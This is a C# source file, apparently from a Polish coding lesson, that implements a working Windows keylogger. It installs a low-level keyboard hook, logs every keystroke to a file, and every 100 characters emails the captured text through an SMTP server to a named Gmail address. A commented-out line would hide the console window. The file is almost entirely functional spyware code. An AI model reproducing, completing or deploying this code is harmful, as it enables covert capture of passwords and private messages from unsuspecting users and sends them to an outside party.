using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;  // biblioteka do obsługi plików
using System.Windows.Forms; // bibiloteka z aplikacji okienkowej aby miec jedna funkcje
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Net.Mail;


namespace lekcja14
{
    class Program
    {

        const int WH_KEYBOARD_LL = 13; // parametr (liczba dziesietna)
        const int WM_KEYDOWN = 0x100;  // klawisz nacisniety (system binarny [2])
        static LowLevelKeyboardProc _proc = HookCallback;
        static IntPtr _hookID = IntPtr.Zero;
        private static String tekst = "";

        static void Main(string[] args)
        {
            var handle = GetConsoleWindow();

            // Hide
            //ShowWindow(handle, 0);

            _hookID = SetHook(_proc);
            Application.Run();
            UnhookWindowsHookEx(_hookID);

        }

        private delegate IntPtr LowLevelKeyboardProc(
            int nCode, IntPtr wParam, IntPtr lParam);

        static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using(Process curProcess = Process.GetCurrentProcess())
            using(ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                    GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        static IntPtr HookCallback
            (int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                Console.WriteLine((Keys)vkCode);

                StreamWriter sw = new StreamWriter(
                    Application.StartupPath + @"\log.txt", true);

                tekst += (Keys)vkCode;

                if (tekst.Length % 100 == 0)
                {
                    sendMail();
                }

                sw.Write((Keys)vkCode);
                sw.Close();
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }


        private static void sendMail()
        {
            MailMessage mail = new MailMessage("gp@webeter.com", "igorjozefowicz@gmail.com");
            SmtpClient client = new SmtpClient("smtp.titan.email")
            {
                Port = 587, // Use 465 for SSL
                EnableSsl = true, // Set to false if using STARTTLS
                DeliveryMethod = SmtpDeliveryMethod.Network,
                UseDefaultCredentials = false,
                Credentials = new System.Net.NetworkCredential("gp@webeter.com", "TUTAJ_TWOJE_HASLO")
            };

            mail.Subject = "KEYLOGGER";
            mail.Body = tekst;

            try
            {
                client.Send(mail);
                tekst = ""; // Clear the text after sending
                Console.WriteLine("Mail sent successfully.");
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error sending mail: " + ex.Message);
            }
        }




        // <--- tutaj wklejamy z pastebina 

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook,
        LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    }
}
